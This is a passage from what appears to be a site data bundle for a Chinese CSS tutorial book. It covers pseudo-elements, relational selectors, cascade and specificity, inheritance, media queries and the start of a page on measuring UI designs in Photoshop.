href="movie1.mp4">狄仁杰之通天帝国</a></li>\x3c!--前面会带上"###"，后面会带上红色文字--\x3e\n        <li><a href="movie2.mp4">精武风云</a></li>\x3c!--前面会带上"###"，后面会带上红色文字--\x3e\n        <li><a href="movie3.mp4">大笑江湖</a></li>\x3c!--前面会带上"###"，后面会带上红色文字--\x3e\n    </ul>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n这两种选择器的content为none的话就代表不插入内容，有些情况下normal也是同样的效果。这个功能就能控制哪些使用追加哪些不使用，比如提示博客哪些是上新的在头部或尾部加个小提示。\n\n而且content还能插入图片例如url(mark.png)，它比background-image:url(mark.png)这种方式追加多一个好处就是，它可以使用打印机打印出来。\n\ncontent使用counter可以作为编号追加到元素上，常和css的counter-increment搭配使用。甚至使用counter的第二个参数给编号指定类型，例如counter(section, upper-alpha)，这是使用了大写字母编号，upper-roman是大写罗马字母等等。\n\n<html>\n<head>\n    <style type="text/css">\n        body { counter-reset:section; }  /*设置或重置section*/\n        h1 { counter-reset:subsection; } /*设置或重置subsection*/\n        h1::before {\n            counter-increment:section;              /*增量计数section*/\n            content:"第" counter(section) "章 ";    /*使用section*/\n            /*其他样式*/\n        }\n        h2::before {\n            counter-increment:subsection;                           /*增量计数subsection*/\n            content:counter(section) "." counter(subsection) " ";   /*使用section和subsection*/\n            /*其他样式*/\n        }\n    </style>\n</head>\n<body>\n    <h1>html tutorials</h1>\n    <h2>html tutorial</h2>\n    <h2>xhtml tutorial</h2>\n    <h2>css tutorial</h2>\n\n    <h1>scripting tutorials</h1>\n    <h2>javascript</h2>\n    <h2>vbscript</h2>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\ncontent除了使用counter，还可以使用open-quote和close-quote来给元素的首尾添加引号、括号等嵌套文字字符\n\n<html>\n<head>\n    <style type="text/css">\n        h1 { quotes: "(" ")" "[" "]"; } /* 前两个值规定第一级引用嵌套，后两个值规定下一级引号嵌套。 */\n        h1::before { content: open-quote; }\n        h1::after { content: close-quote; }\n    </style>\n</head>\n<body>\n    <h1>标题</h1>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# selection\n\nselection用处于被选中的那部分进行指定样式。\n\n<html>\n<head>\n    <style type="text/css">\n        input[type="text"]::selection { background:gray; color:#fff; }\n        p::selection { background:red; color:#fff; }\n    </style>\n</head>\n<body>\n    <p>这是一段测试文字</p>\x3c!--鼠标选中一部分文字时，选中区域是红色的--\x3e\n    <input type="text" value="这是一段测试文字" />\x3c!--鼠标选中一部分文字时，选中区域是灰色的--\x3e\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 五、关系选择器\n\n\n# 5. 后代选择器\n\n后代选择器是用单个空格来组合多个选择器，这些被组合起来的选择器是祖先与后代的关系。\n\n<html>\n<head>\n    <style type="text/css">\n        .box p { color: red; }  \n    </style>\n</head>\n<body>\n    <div class="box"><p>text in .box</p></div>\n    <p>text not in .box</p>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# 5.2 子代关系选择器\n\n子代关系选择器是用大于号来组合元素与它的直接子元素的。\n\n<html>\n<head>\n    <style type="text/css">\n        .ulc > li {  border-top: 5px solid red; }  \n    </style>\n</head>\n<body>\n    <ul class="ulc">\n        <li>unordered item</li> \x3c!--有上边框--\x3e\n        <li>unordered item      \x3c!--有上边框--\x3e\n            <ul>\n                <li>item 1</li> \x3c!--没有边框--\x3e\n                <li>item 2</li> \x3c!--没有边框--\x3e\n            </ul>\n        </li>\n    </ul>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n\n# 5.3 邻接兄弟选择器\n\n邻接兄弟选择器是用加号来选中同级的邻接兄弟元素（下一个）。\n\n<html>\n<head>\n    <style type="text/css">\n        h1 + p { color: red; }\n    </style>\n</head>\n<body>\n    <article>\n        <h1>标题</h1>\n        <p>文章段落1</p>\x3c!--文字红色--\x3e\n        <p>文章段落2</p>\n    </article>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# 5.4 通用兄弟选择器\n\n通用兄弟选择器是用波浪号来选中同级的某类兄弟元素，不管是否紧挨着。\n\n<html>\n<head>\n    <style type="text/css">\n        h1 ~ p { color: red; }\n    </style>\n</head>\n<body>\n    <article>\n        <h1>a heading</h1>\n        <p>i am a paragraph.</p>\x3c!--文字红色--\x3e\n        <div>i am a div</div>\n        <p>i am another paragraph.</p>\x3c!--文字红色--\x3e\n    </article>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# 六、层叠与继承\n\n\n# 6.1 层叠和继承的简述\n\ncss的首字母cascade，也就是层叠的意思。你可以对同一个元素使用多个css样式，规则相同（同一优先级）时前面写的样式会被后面写的样式覆盖掉，如果规则（优先级）不同，即使写在前面也是优先级高的生效。\n\n<html>\n<head>\n    <style type="text/css">\n      h1 {\n        color: red;\n      }\n      h1 {\n        color: blue;\n      }\n    </style>\n</head>\n<body>\n    \x3c!-- 两个样式同规则，最后一个生效，蓝色 --\x3e\n    <h1>this is my heading.</h1>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n样式也可以继承，具体来说是设置在父元素上的css属性是可以被子元素继承的。\n\n<html>\n<head>\n    <style type="text/css">\n      ul {\n        color: red;\n      }\n    </style>\n</head>\n<body>\n    <ul>\n        <li>111</li>\x3c!-- 继承ul的颜色：红色 --\x3e\n        <li>222</li>\x3c!-- 继承ul的颜色：红色 --\x3e\n        <li>333</li>\x3c!-- 继承ul的颜色：红色 --\x3e\n    </ul>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# 6.2 继续了解css继承\n\n有些样式是可以继承的，但有些样式是不可以的，比如width、margin、padding和border等，像最最基础的font和color这些非常常用就会让它们可以被继承，而一些宽度、边框、比距要是能继承那在操作子元素时会非常麻烦，这些属性在一些场景下都是使用默认值。\n\n<html>\n<head>\n    <style type="text/css">\n        .main {\n            color: red;\n            border: 2px solid #ccc;\n            padding: 1em;\n        }\n        .special {\n            font-weight: bold;\n        }\n    </style>\n</head>\n<body>\n    <ul class="main">\n        <li>111</li>\n        <li>222</li>\n        <li>333\n            \x3c!--继承了父元素的红色，但是border和padding继承不了--\x3e\n            <ul class="special">\n                <li>444</li>\n                <li>555</li>\n            </ul>\n        </li>\n    </ul>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n可以看到最外层的ul是有边框和边距的，内层的ul就没有继承这两个属性，只继承了颜色。注意：千万别把.main替换成ul，这样就不是讨论继承了，这是对所有ul设置一样的样式。\n\n为了控制继承，css为属性提供了四个通用值：\n\n * initial：使用浏览器默认样式\n * inherit：继承父元素\n * unset：属性默认是可继承就为inherit否则为initial，其实一般默认不可继承\n * revert：还原，会使用用户定义样式表，其他情况跟unset差不多。链接。\n\n这个四个通用属性值一般用于单个属性上，其实也可以对一个元素所有样式进行控制，也就是使用all这个属性:\n\n<html>\n<head>\n    <style type="text/css">\n        div {\n            background-color: red;\n            border: 2px solid green;\n        }\n        .fix-this {\n            all: unset;\n        }\n    </style>\n</head>\n<body>\n    <div>\n        <p>this blockquote is styled</p>\n    </div>\n    \x3c!--all: unset，回到最初的样式，也就是浏览器默认样式--\x3e\n    <div class="fix-this">\n        <p>this blockquote is not styled</p>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n\n# 6.3 继续了解层叠\n\n我们回过头来说层叠，规则不同会影响同一元素的显示效果，即使优先级高的代码靠前也不会被后面低优先级的覆盖。那么优先级是如何计算的呢？其实不同类型的选择器有不同的分数值，把目标元素的某一个样式中使用的选择器加起来就可以进行比较优先级了。\n\n 1. 千位： 样式定义在元素的style属性上，则得一千分。\n 2. 百位： 选择器中包含id选择器，则得一百分。\n 3. 十位： 选择器中包含类选择器、属性选择器或者伪类，则得十分。\n 4. 个位： 选择器中包含元素选择器、伪元素选择器，则得一分。\n\n例如：\n\n选择器                                       千位   百位   十位   个位   优先级\nh1                                        0    0    0    1    0001\nh1 + p::first-letter                      0    0    0    3    0003\nli > a[href*="en-us"] > .inline-warning   0    0    2    2    0022\n#identifier                               0    1    0    0    0100\n内联样式                                      1    0    0    0    1000\n\n<html>\n<head>\n    <style type="text/css">\n        #outer a {          /* specificity: 0101 */\n            background-color: red;\n        }\n        #outer #inner a {   /* specificity: 0201 */\n            background-color: blue;\n        }\n        #outer div ul li a { /* specificity: 0104 */\n            color: yellow;\n        }\n        /* specificity: 0113 */\n        #outer div ul .nav a { color: white; }\n        /* specificity: 0024 */\n        div div li:nth-child(2) a:hover { border: 10px solid black; }\n        /* specificity: 0023 */\n        div li:nth-child(2) a:hover { border: 10px dashed black; }\n        /* specificity: 0033 */\n        div div .nav:nth-child(2) a:hover { border: 10px double black; }\n        a { display: inline-block; line-height: 40px; font-size: 20px; text-decoration: none;\n            text-align: center; width: 200px; margin-bottom: 10px; }\n        ul { padding: 0; }\n        li { list-style-type: none; }\n    </style>\n</head>\n<body>\n    <div id="outer" class="container">\n      <div id="inner" class="container">\n          <ul>\n              <li class="nav"><a href="#">one</a></li>\x3c!-- 0201分获胜，蓝色 --\x3e\n              <li class="nav"><a href="#">two</a></li>\x3c!-- 0201分获胜，蓝色 --\x3e\n          </ul>\n      </div>\n  </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n\n\n!important这个属性设置会覆盖原有的优先级（针对属性），尽管我这条样式的优先级很低，但我样式中的属性使用了!important，那么其他地方的样式中的这个属性只能听我的。\n\n<html>\n<head>\n    <style type="text/css">\n        #winning { background-color: red; border: 1px solid black; }\n        .better { background-color: gray; border: none !important; }\n        p { background-color: blue; color: white; padding: 5px; }\n    </style>\n</head>\n<body>\n    <p class="better">this is a paragraph.</p>\n    <p class="better" id="winning">one selector to rule them all!</p>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n上面这个例子逐步分析：\n\n * 初步分析p标签应该是蓝底白字；\n * 因为类选择器的缘故应该是灰底白字没有边框；\n * 而第二个<p>单独使用了id选择器，那么第二个<p>应该是红底白字有边框；\n * border曾设置过!important，那么即使id选择器优先级高也不能忽视低优先级类选择器里设置的!important，所以第二个<p>也无边框。\n\n注意：不到万不得已不要使用!important，它打乱了优先级，覆盖已有的!important又要在同优先级或高优先级使用!important来抵消，要是其他地方也要改也要这样设置。',charsets:{cjk:!0}},{title:"10.媒体查询",frontmatter:{title:"10.媒体查询"},regularPath:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0CSS/10.%E5%AA%92%E4%BD%93%E6%9F%A5%E8%AF%A2.html",relativePath:"book-web/html、css、js、ts/学习CSS/10.媒体查询.md",key:"v-71c49bdf",path:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0CSS/10.%E5%AA%92%E4%BD%93%E6%9F%A5%E8%AF%A2.html",headers:[{level:2,title:"基本用法",slug:"基本用法",normalizedTitle:"基本用法",charIndex:11},{level:3,title:"html中使用",slug:"html中使用",normalizedTitle:"html中使用",charIndex:93},{level:3,title:"css中使用",slug:"css中使用",normalizedTitle:"css中使用",charIndex:420},{level:2,title:"媒体类型",slug:"媒体类型",normalizedTitle:"媒体类型",charIndex:175},{level:3,title:"四种常见媒体类型",slug:"四种常见媒体类型",normalizedTitle:"四种常见媒体类型",charIndex:1036},{level:3,title:"and、not和逗号",slug:"and、not和逗号",normalizedTitle:"and、not和逗号",charIndex:1232},{level:2,title:"媒体特性",slug:"媒体特性",normalizedTitle:"媒体特性",charIndex:1576},{level:2,title:"断点设置",slug:"断点设置",normalizedTitle:"断点设置",charIndex:5511}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"基本用法 html中使用 css中使用 媒体类型 四种常见媒体类型 and、not和逗号 媒体特性 断点设置",content:'# 媒体查询\n\n\n# 基本用法\n\n不同的屏幕，web展示的效果可能不一样。那么就需要在一部分设备里使用一种样式，另一部分使用另一种样式，具体使用过“媒体查询”这一机制来实现的。\n\n\n# html中使用\n\n在html中引用或使用不同媒体下的样式，需要用到media这个属性。如果没有加上media这个属性，那么css样式会应用到所有媒体上，也就是不区分媒体类型。media后面的值是媒体类型，后面会讲有哪些。\n\n\x3c!-- 引入外部的css文件，只适用于打印设备 --\x3e\n<link rel="stylesheet" type="text/css" href="xxx-print.css" media="print" />\n\x3c!-- 直接书写css样式，适用于电脑手机等设备 --\x3e\n<style type="text/css" media="screen">\n    body {}\n</style>\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# css中使用\n\n在css中引用不同媒体下的其他css样式，需要配合@import和媒体类型的使用。\n\n@import url(xxx.css) screen;\n@import url(xxx.css) speech;\n@import url(xxx.css) print;\n\n\n1\n2\n3\n\n\n在css中书写不同媒体对应不同样式时，需要配合@media和媒体类型的使用。\n\n<style type="text/css">\n    /* 因为<style>中没有media属性，所以这是所有媒体 */\n    body { background: white; color: black; }\n    /* 文档阅读媒体，最常见的 */\n    @media screen {\n        body { font-family: sans-serif; }\n        h1 { margin-top: 1em; }\n    }\n    /* 打印媒体 */\n    @media print {\n        body { font-family: serif; }\n        h1 { margin-top: 2em; border-bottom: 1px solid silver}\n    }\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# 媒体类型\n\n\n# 四种常见媒体类型\n\n以下是四种常见的媒体，h4时代定义了很多媒体类型现在大多弃用了。\n\n媒体类型     说明\nall      所有内呈现内容的媒体\nprint    打印给非盲用户看的文档，或者是文档的打印预览\nscreen   呈现文档的屏幕媒体，例如电脑和手机等。运行在这种系统上的web浏览器是屏幕媒体的用户代理\nspeech   语音合成器、屏幕阅读器或其他音频渲染设备\n\n\n# and、not和逗号\n\n可能有时候需要使用到复合媒体（其中两种媒体类型共用样式比较多），那么可以在media中的值穿插逗号,，有些类似or的意思，但media中是没有or的。\n\n<link rel="stylesheet" type="text/css" href="xxx-print.css" media="screen, print" />\n\n<style type="text/css">\n    @import url(xxx.css) screen, print;\n\n    @media screen, print { }\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n有使用在媒体中某个特定条件下使用样式，那么可以在使用media搭配and来使用，and后面接的是媒体特性（下一节会讲）。\n\n\x3c!-- 彩色打印，黑白的打印就不行 --\x3e\n<link rel="stylesheet" type="text/css" href="xxx-print.css" media="print and (color)" />\n\n<style type="text/css">\n    @import url(xxx.css) print and (color);\n\n    @media print and (color) { }\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\x3c!-- 彩色打印 或者 彩色屏幕，黑白的不行 --\x3e\n<link rel="stylesheet" type="text/css" href="xxx-print.css" media="print and (color), screen and (color)" />\n\n<style type="text/css">\n    @import url(xxx.css) print and (color), screen and (color);\n\n    @media print and (color), screen and (color) { }\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n说了逗号和and后，还剩下一个not，它是对整个查询结果取反，这个not是放在查询开头的，不像and是穿插在媒体特性之间的。\n\n<html>\n<head>\n<style type="text/css">\n    /* 分辨率大于或等于72点每英寸的显示屏上 */\n    @media screen and (min-resolution: 72dpi) { .cl01 {font-style: italic;} }\n    /* 分辨率大于或等于32767点每英寸的显示屏上 */\n    @media screen and (min-resolution: 32767dpi) { .cl02 {font-style: italic;} }\n    /* 不在打印媒体上时（或不打印预览时） */\n    @media not print { .cl03 {font-style: italic;} }\n    /* 即不在打印媒体上也不是灰度设备 */\n    @media not print and (grayscale) { .cl04 {font-style: italic;} }\n    .arena p[class]::before { content: "[." attr(class) "] "; }\n</style>\n</head>\n<body>\n    <div class="arena">\n        <p class="cl01">This is the first paragraph.</p>\n        <p class="cl02">This is the second paragraph.</p>\n        <p class="cl03">This is the third paragraph.</p>\n        <p class="cl04">This is the fourth paragraph.</p>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n\n# 媒体特性\n\n媒体特性要放在()里使用，其取值基本上都不会是负数，下面列出一些媒体特性：\n\n媒体特性                                                  取值\nwidth, min-width, max-width                           <length>，用户代理（浏览器）显示区域宽度（包含滚动条）。例如(min-width:\n                                                      850px)在视区宽度大于或等于850px时起作用。\nheight, min-height, max-height                        <length>，用户代理（浏览器）显示区域高度（包含滚动条）。例如(height:\n                                                      567px)在视区高度正好是567px时起作用。\ndevice-width, min-device-width, max-device-width      <length>，设备屏幕宽度。例如(max-device-width:\n                                                      1200px)在设备屏幕宽度小于或等于1200px时起作用。\ndevice-height, min-device-height, max-device-height   <length>，设备屏幕高度。例如(max-device-height:\n                                                      400px)在设备屏幕高度小于或等于400px时起作用。\naspect-ratio, min-aspect-ratio, max-aspect-ratio      <ratio>，媒体特性width与媒体特性height的比值。例如(min-aspect-ratio:\n                                                      2/1)在视区的宽高比大于或等于2时起作用。\ndevice-aspect-ratio, min-device-aspect-ratio,         <ratio>，媒体特性device-width与媒体特性device-height的比值。例如(device-aspect-ratio:\nmax-device-aspect-ratio                               16/9)在设备屏幕的宽高比正好是16:9时起作用。\ncolor, min-color, max-color                           <integer>，判断媒体是否支持彩色显示，可选的数值表示每个色彩分量使用的位数。例如(color)在媒体具有色彩深度时就起作用。例如(min-color:\n                                                      4)每个色彩分量至少有4位时起作用。\ncolor-index, min-color-index, max-color-index         <integer>，媒体色彩搜寻列表中共用的颜色。例如(color-index)在媒体具有色彩搜寻列表时就起作用。例如(min-color-index:\n                                                      256)在至少256个颜色可用的媒体中时起作用。\nmonochrome, min-monochrome, max-monochrome            <integer>，判断显示屏是不是单色，可选的数值表示在输出设备的帧缓冲器中每像素有多少位。例如(monochrome)在单色的输出设备时就起作用。例如(min-monochrome:\n                                                      2)输出设备的帧缓冲器中每像素至少为2时起作用。\nresolution, min-resolution, max-resolution            <resolution>，指以像素密度表示的输出设备的分辨率（每英寸有多少像素点，dpi）。例如(min-resolution:\n                                                      72dpi)在输出设备分辨率至少为721dpi时起作用。\norientation                                           portrait或landscape，指用户代理的显示区域放置的方向。媒体特性height大于或等于width（不是设备屏幕宽高），返回portrait，否则返回landscape。\nscan                                                  progressive或interlace，指输出设备使用的扫描方式。CRT和某些等离子显示屏一般使用interlace，而多数现代的显示屏是使用progressive。\ngrid                                                  0或1，判断是否为基于网格的输出设备（例如TTY终端）。基于网格返回1，否则返回0。\n\n\n# 断点设置\n\n在屏幕大小不一的情况下，我们会使用媒体查询的断点来设置临界条件，列如将屏幕分为大屏中屏小屏等。断点经常以特定大小的像素宽度形式表示的（px、em等）。\n\n/* 至多400px宽度时 */\n@media screen and (max-width: 400px) {  }\n/* 401px到1000px宽度时 */\n@media screen and (min-width: 401px) and (max-width: 1000px) {  }\n/* 至少1001px宽度时 */\n@media screen and (min-width: 1001px) {  }\n\n\n1\n2\n3\n4\n5\n6\n\n\n当然有些设备可以横向或者竖向展示，那么使用断点配合orientation媒体特性是很有必要的。',normalizedContent:'# 媒体查询\n\n\n# 基本用法\n\n不同的屏幕，web展示的效果可能不一样。那么就需要在一部分设备里使用一种样式，另一部分使用另一种样式，具体使用过“媒体查询”这一机制来实现的。\n\n\n# html中使用\n\n在html中引用或使用不同媒体下的样式，需要用到media这个属性。如果没有加上media这个属性，那么css样式会应用到所有媒体上，也就是不区分媒体类型。media后面的值是媒体类型，后面会讲有哪些。\n\n\x3c!-- 引入外部的css文件，只适用于打印设备 --\x3e\n<link rel="stylesheet" type="text/css" href="xxx-print.css" media="print" />\n\x3c!-- 直接书写css样式，适用于电脑手机等设备 --\x3e\n<style type="text/css" media="screen">\n    body {}\n</style>\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# css中使用\n\n在css中引用不同媒体下的其他css样式，需要配合@import和媒体类型的使用。\n\n@import url(xxx.css) screen;\n@import url(xxx.css) speech;\n@import url(xxx.css) print;\n\n\n1\n2\n3\n\n\n在css中书写不同媒体对应不同样式时，需要配合@media和媒体类型的使用。\n\n<style type="text/css">\n    /* 因为<style>中没有media属性，所以这是所有媒体 */\n    body { background: white; color: black; }\n    /* 文档阅读媒体，最常见的 */\n    @media screen {\n        body { font-family: sans-serif; }\n        h1 { margin-top: 1em; }\n    }\n    /* 打印媒体 */\n    @media print {\n        body { font-family: serif; }\n        h1 { margin-top: 2em; border-bottom: 1px solid silver}\n    }\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# 媒体类型\n\n\n# 四种常见媒体类型\n\n以下是四种常见的媒体，h4时代定义了很多媒体类型现在大多弃用了。\n\n媒体类型     说明\nall      所有内呈现内容的媒体\nprint    打印给非盲用户看的文档，或者是文档的打印预览\nscreen   呈现文档的屏幕媒体，例如电脑和手机等。运行在这种系统上的web浏览器是屏幕媒体的用户代理\nspeech   语音合成器、屏幕阅读器或其他音频渲染设备\n\n\n# and、not和逗号\n\n可能有时候需要使用到复合媒体（其中两种媒体类型共用样式比较多），那么可以在media中的值穿插逗号,，有些类似or的意思，但media中是没有or的。\n\n<link rel="stylesheet" type="text/css" href="xxx-print.css" media="screen, print" />\n\n<style type="text/css">\n    @import url(xxx.css) screen, print;\n\n    @media screen, print { }\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n有使用在媒体中某个特定条件下使用样式，那么可以在使用media搭配and来使用，and后面接的是媒体特性（下一节会讲）。\n\n\x3c!-- 彩色打印，黑白的打印就不行 --\x3e\n<link rel="stylesheet" type="text/css" href="xxx-print.css" media="print and (color)" />\n\n<style type="text/css">\n    @import url(xxx.css) print and (color);\n\n    @media print and (color) { }\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\x3c!-- 彩色打印 或者 彩色屏幕，黑白的不行 --\x3e\n<link rel="stylesheet" type="text/css" href="xxx-print.css" media="print and (color), screen and (color)" />\n\n<style type="text/css">\n    @import url(xxx.css) print and (color), screen and (color);\n\n    @media print and (color), screen and (color) { }\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n说了逗号和and后，还剩下一个not，它是对整个查询结果取反，这个not是放在查询开头的，不像and是穿插在媒体特性之间的。\n\n<html>\n<head>\n<style type="text/css">\n    /* 分辨率大于或等于72点每英寸的显示屏上 */\n    @media screen and (min-resolution: 72dpi) { .cl01 {font-style: italic;} }\n    /* 分辨率大于或等于32767点每英寸的显示屏上 */\n    @media screen and (min-resolution: 32767dpi) { .cl02 {font-style: italic;} }\n    /* 不在打印媒体上时（或不打印预览时） */\n    @media not print { .cl03 {font-style: italic;} }\n    /* 即不在打印媒体上也不是灰度设备 */\n    @media not print and (grayscale) { .cl04 {font-style: italic;} }\n    .arena p[class]::before { content: "[." attr(class) "] "; }\n</style>\n</head>\n<body>\n    <div class="arena">\n        <p class="cl01">this is the first paragraph.</p>\n        <p class="cl02">this is the second paragraph.</p>\n        <p class="cl03">this is the third paragraph.</p>\n        <p class="cl04">this is the fourth paragraph.</p>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n\n# 媒体特性\n\n媒体特性要放在()里使用，其取值基本上都不会是负数，下面列出一些媒体特性：\n\n媒体特性                                                  取值\nwidth, min-width, max-width                           <length>，用户代理（浏览器）显示区域宽度（包含滚动条）。例如(min-width:\n                                                      850px)在视区宽度大于或等于850px时起作用。\nheight, min-height, max-height                        <length>，用户代理（浏览器）显示区域高度（包含滚动条）。例如(height:\n                                                      567px)在视区高度正好是567px时起作用。\ndevice-width, min-device-width, max-device-width      <length>，设备屏幕宽度。例如(max-device-width:\n                                                      1200px)在设备屏幕宽度小于或等于1200px时起作用。\ndevice-height, min-device-height, max-device-height   <length>，设备屏幕高度。例如(max-device-height:\n                                                      400px)在设备屏幕高度小于或等于400px时起作用。\naspect-ratio, min-aspect-ratio, max-aspect-ratio      <ratio>，媒体特性width与媒体特性height的比值。例如(min-aspect-ratio:\n                                                      2/1)在视区的宽高比大于或等于2时起作用。\ndevice-aspect-ratio, min-device-aspect-ratio,         <ratio>，媒体特性device-width与媒体特性device-height的比值。例如(device-aspect-ratio:\nmax-device-aspect-ratio                               16/9)在设备屏幕的宽高比正好是16:9时起作用。\ncolor, min-color, max-color                           <integer>，判断媒体是否支持彩色显示，可选的数值表示每个色彩分量使用的位数。例如(color)在媒体具有色彩深度时就起作用。例如(min-color:\n                                                      4)每个色彩分量至少有4位时起作用。\ncolor-index, min-color-index, max-color-index         <integer>，媒体色彩搜寻列表中共用的颜色。例如(color-index)在媒体具有色彩搜寻列表时就起作用。例如(min-color-index:\n                                                      256)在至少256个颜色可用的媒体中时起作用。\nmonochrome, min-monochrome, max-monochrome            <integer>，判断显示屏是不是单色，可选的数值表示在输出设备的帧缓冲器中每像素有多少位。例如(monochrome)在单色的输出设备时就起作用。例如(min-monochrome:\n                                                      2)输出设备的帧缓冲器中每像素至少为2时起作用。\nresolution, min-resolution, max-resolution            <resolution>，指以像素密度表示的输出设备的分辨率（每英寸有多少像素点，dpi）。例如(min-resolution:\n                                                      72dpi)在输出设备分辨率至少为721dpi时起作用。\norientation                                           portrait或landscape，指用户代理的显示区域放置的方向。媒体特性height大于或等于width（不是设备屏幕宽高），返回portrait，否则返回landscape。\nscan                                                  progressive或interlace，指输出设备使用的扫描方式。crt和某些等离子显示屏一般使用interlace，而多数现代的显示屏是使用progressive。\ngrid                                                  0或1，判断是否为基于网格的输出设备（例如tty终端）。基于网格返回1，否则返回0。\n\n\n# 断点设置\n\n在屏幕大小不一的情况下，我们会使用媒体查询的断点来设置临界条件，列如将屏幕分为大屏中屏小屏等。断点经常以特定大小的像素宽度形式表示的（px、em等）。\n\n/* 至多400px宽度时 */\n@media screen and (max-width: 400px) {  }\n/* 401px到1000px宽度时 */\n@media screen and (min-width: 401px) and (max-width: 1000px) {  }\n/* 至少1001px宽度时 */\n@media screen and (min-width: 1001px) {  }\n\n\n1\n2\n3\n4\n5\n6\n\n\n当然有些设备可以横向或者竖向展示，那么使用断点配合orientation媒体特性是很有必要的。',charsets:{cjk:!0}},{title:"11.还原UI设计",frontmatter:{title:"11.还原UI设计"},regularPath:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0CSS/11.%E8%BF%98%E5%8E%9FUI%E8%AE%BE%E8%AE%A1.html",relativePath:"book-web/html、css、js、ts/学习CSS/11.还原UI设计.md",key:"v-63eaf561",path:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0CSS/11.%E8%BF%98%E5%8E%9FUI%E8%AE%BE%E8%AE%A1.html",headers:[{level:2,title:"一、Photoshop还原UI设计",slug:"一、photoshop还原ui设计",normalizedTitle:"一、photoshop还原ui设计",charIndex:111},{level:2,title:"二、使用蓝湖快速标注信息",slug:"二、使用蓝湖快速标注信息",normalizedTitle:"二、使用蓝湖快速标注信息",charIndex:1003},{level:2,title:"三、PxCook和ImgCook",slug:"三、pxcook和imgcook",normalizedTitle:"三、pxcook和imgcook",charIndex:1735}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"一、Photoshop还原UI设计 二、使用蓝湖快速标注信息 三、PxCook和ImgCook",content:"# 还原UI设计\n\nUI设计师给前端开发人员提供了UI设计图，前端开发人员拿这个UI设计图进行精细的切图操作。切图过程中有尺寸测量、颜色吸取、字体大小测量等，需要使用比较专业的软件来辅助前端开发人员进行切图操作。\n\n\n# 一、Photoshop还原UI设计\n\n将一个PSD文件使用Photoshop打开，在测量大小和距离时，可以选择矩形选框和信息面板进行配合：\n\n * 矩形选框在Photoshop界面的左边工具栏第二个位置\n   * \n * 信息面板需要在窗口-信息里勾选上\n   * \n * 然后查看选项面板是否使用的是像素。\n   * \n   * \n * 我们使用矩形选框就可以测量距离了，距离数值会在信息面板里展示。如果需要微调选框，可以按住Shift键并点击目标就可增大选框，可以按住Alt键并点击目标就可减小选框。\n\n另一种测量大小和距离的方式是使用移动工具：\n\n * 移动工具在Photoshop界面的左边工具栏第一个位置\n   * \n * 选择了移动工具，我们点击一个目标（选中了图层），然后按住Ctrl键，移动鼠标悬停在另一个目标，就能测出它们之间的距离了。\n   * \n\n除了测距和大小，我们可以吸取颜色，获得颜色的数值：\n\n * 吸管在Photoshop界面的左边工具栏第七个位置\n   * \n * 使用Ctrl键+鼠标滚轮可以调整PSD的显示位置，Alt键+鼠标滚轮可以调整PSD的显示大小。便于吸取颜色。\n * 